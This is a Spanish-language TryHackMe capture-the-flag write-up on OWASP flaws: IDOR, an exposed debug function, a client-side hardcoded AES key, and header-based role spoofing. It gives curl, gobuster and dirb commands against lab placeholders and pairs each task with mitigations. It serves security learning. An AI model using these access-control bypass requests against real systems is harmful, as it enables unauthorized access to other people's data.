# TryHackMe — OWASP Top 10 2025
## Room 2: Application Design Flaws

**Plataforma:** TryHackMe  
**Dificultad:** Media  
**Categoría:** Web Application Security  
**OWASP:** A02, A03, A06, A10  

---

## Índice

1. [Conceptos Clave](#conceptos-clave)
2. [Tarea 1 — IDOR (Insecure Direct Object Reference)](#tarea-1--idor)
3. [Tarea 2 — Vulnerable Components & Command Injection](#tarea-2--vulnerable-components--command-injection)
4. [Tarea 3 — Cryptographic Failures](#tarea-3--cryptographic-failures)
5. [Tarea 4 — Insecure Design](#tarea-4--insecure-design)
6. [Herramientas Utilizadas](#herramientas-utilizadas)
7. [Lecciones Aprendidas](#lecciones-aprendidas)

---

## Conceptos Clave

| Concepto | Descripción |
|----------|-------------|
| **Autenticación** | Verificar que el usuario es quien dice ser |
| **Autorización** | Definir qué puede hacer ese usuario |
| **IDOR** | Acceso a recursos de otros usuarios manipulando identificadores |
| **Insecure Design** | Fallos de seguridad por malas decisiones arquitectónicas |
| **Broken Access Control** | Fallo al restringir correctamente el acceso a recursos |

---

## Tarea 1 — IDOR

### Vulnerabilidad
**IDOR (Insecure Direct Object Reference)** — A01 Broken Access Control

### Descripción
La aplicación expone referencias directas a objetos en la URL sin verificar si el usuario tiene permisos para acceder a ellos.

### Explotación
La web mostraba en su log de tráfico una ruta como:
```
GET /API/user/123
```
Accediendo directamente a dicha ruta con el nombre de usuario se obtuvo la flag.

```
http://IP:PORT/API/user/admin
```

### Concepto
> El servidor no verifica si el usuario autenticado tiene permiso para acceder al recurso solicitado. Simplemente devuelve lo que se le pide.

### Mitigación
- Implementar control de acceso en el servidor para cada recurso.
- Nunca confiar en identificadores del cliente sin validación.

---

## Tarea 2 — Vulnerable Components & Command Injection

### Vulnerabilidad
**A06 — Vulnerable and Outdated Components + Command Injection**

### Descripción
La aplicación importaba una librería local no verificada (`vulnerable_utils.py`) y exponía un endpoint `/api/process` que procesaba input del usuario sin sanitización.

### Reconocimiento
Código fuente de la aplicación:
```python
# Import from local unverified library
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'lib'))
from vulnerable_utils import process_data, format_output, debug_info

@app.route('/api/process', methods=['POST'])
```

### Explotación
Petición POST al endpoint con valor especial:
```bash
curl -X POST http://IP:PORT/api/process \
  -H "Content-Type: application/json" \
  -d '{"data": "debug"}'
```
El valor `debug` activó la función `debug_info` de la librería vulnerable, devolviendo la flag.

### Concepto
> Usar librerías no verificadas o desactualizadas puede introducir vulnerabilidades que el desarrollador desconoce. Nunca usar componentes sin auditar.

### Mitigación
- Auditar todas las dependencias externas.
- Mantener componentes actualizados.
- Nunca exponer funciones de debug en producción.

---

## Tarea 3 — Cryptographic Failures

### Vulnerabilidad
**A02 — Cryptographic Failures**

### Descripción
Una aplicación de visualización de documentos cifraba su contenido con AES-128-ECB, pero la clave secreta estaba hardcodeada en el JavaScript del cliente.

### Reconocimiento
Inspeccionando el archivo `decrypt.js` accesible públicamente:
```
http://IP:PORT/static/js/decrypt.js
```

Se encontró:
```javascript
const SECRET_KEY = "my-secret-key-16";
const ENCRYPTION_MODE = "ECB";
const KEY_SIZE = 128;
```

### Explotación
Con la clave obtenida, se descifró el documento en CyberChef:

1. **From Base64**
2. **AES Decrypt**
   - Key: `my-secret-key-16`
   - Mode: `ECB`
   - Input: `Raw`

### Herramienta
[CyberChef](https://gchq.github.io/CyberChef/)

### Concepto
> La seguridad nunca debe depender de secretos almacenados en el cliente. Cualquier usuario puede inspeccionar el código JavaScript de una web.

### Mitigación
- Nunca almacenar claves de cifrado en el frontend.
- El descifrado debe realizarse siempre en el servidor.
- Usar modos de cifrado seguros (evitar ECB).

---

## Tarea 4 — Insecure Design

### Vulnerabilidad
**A04 — Insecure Design**

### Descripción
Una aplicación de mensajería (SecureChat) asumía que solo dispositivos móviles accederían a ella, sin implementar ninguna restricción real. Además, exponía endpoints de la API sin autenticación y confiaba ciegamente en headers del cliente para determinar el rol del usuario.

### Reconocimiento

#### Enumeración de rutas
```bash
gobuster dir -u http://IP:5005 -w /usr/share/wordlists/dirb/common.txt
dirb http://IP:5005
```

Rutas encontradas:
- `/api/users` → expone todos los usuarios sin autenticación
- `/api/users/admin` → expone datos del admin
- `/console` → consola Werkzeug (400)

#### Information Disclosure
```
GET /api/users
```
Devuelve sin autenticación:
```json
{
  "admin": { "email": "admin@example.com", "name": "Admin", "role": "admin" },
  "user1": { "email": "alice@example.com", "name": "Alice", "role": "user" },
  "user2": { "email": "bob@example.com", "name": "Bob", "role": "user" }
}
```

### Explotación
El servidor confiaba en el header `X-Role` del cliente para determinar permisos. Con las credenciales obtenidas del endpoint público:

```bash
curl http://IP:5005/api/messages/admin \
  -H "X-Role: admin" \
  -H "Authorization: Bearer admin@example.com"
```

Esto devolvió la flag.

### Concepto
> El sistema fue diseñado asumiendo comportamientos que nunca validó:
> - *"Solo móviles accederán"* → sin verificarlo.
> - *"Nadie explorará los endpoints"* → sin protegerlos.
> - *"El cliente dirá quién es admin"* → sin verificarlo en el servidor.

### Mitigación
- Nunca confiar en headers del cliente para control de acceso.
- Proteger todos los endpoints con autenticación real.
- Aplicar el principio de **mínimo privilegio**.
- Seguir el principio **"never trust, always verify"**.

---

## Herramientas Utilizadas

| Herramienta | Uso |
|-------------|-----|
| `curl` | Peticiones HTTP manuales |
| `gobuster` | Enumeración de directorios |
| `dirb` | Enumeración de directorios |
| **Burp Suite** | Interceptar y modificar peticiones |
| **CyberChef** | Decodificación y descifrado |
| **Firefox DevTools** | Análisis de peticiones y código fuente |

### Comandos de referencia

```bash
# Petición GET básica
curl http://IP:PORT/ruta

# Petición POST con JSON
curl -X POST http://IP:PORT/ruta \
  -H "Content-Type: application/json" \
  -d '{"campo": "valor"}'

# Petición con headers personalizados
curl http://IP:PORT/ruta \
  -H "X-Role: admin" \
  -H "Authorization: Bearer usuario"

# Petición con User-Agent personalizado
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0)" http://IP:PORT

# Ver todos los headers de respuesta
curl -I http://IP:PORT
curl -v http://IP:PORT

# Enumeración de directorios
gobuster dir -u http://IP:PORT -w /usr/share/wordlists/dirb/common.txt
dirb http://IP:PORT
```

---

## Lecciones Aprendidas

1. **Siempre enumerar** rutas antes de explorar manualmente — gobuster/dirb pueden encontrar endpoints no obvios.

2. **Las rutas Flask no son jerárquicas** — `/api/users` puede no existir aunque `/api/users/admin` sí.

3. **El cliente nunca es de confianza** — headers, User-Agent, cookies y parámetros pueden ser manipulados por cualquier usuario.

4. **Inspeccionar siempre el código fuente** — claves, rutas y lógica sensible a veces están expuestas en el JavaScript.

5. **Content-Length es un indicador** — si cambia entre peticiones, el servidor está devolviendo contenido diferente.

6. **Insecure Design es el fallo más difícil de corregir** — no es un bug de código, es un fallo de mentalidad que requiere rediseñar la arquitectura.

---

*Writeup realizado como parte del aprendizaje en TryHackMe — OWASP Top 10 2025*
